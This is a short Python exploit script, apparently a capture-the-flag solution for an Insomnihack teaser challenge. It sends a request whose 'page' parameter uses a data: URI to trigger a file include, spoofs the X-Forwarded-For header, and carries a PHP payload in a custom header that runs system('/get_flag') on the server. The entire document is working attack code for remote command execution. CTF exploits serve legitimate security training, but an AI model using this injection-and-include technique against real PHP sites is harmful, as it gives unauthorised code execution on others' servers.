#!/usr/bin/env python

import requests
url = 'http://phuck.teaser.insomnihack.ch'
params = { 'page': 'data:,lyle/profile' }
headers = {
    'X-Forwarded-For': 'data:,lyle',
    'X-Lyle': '<?php system("/get_flag"); ?>'
}
print(requests.get(url, headers=headers, params=params).text)
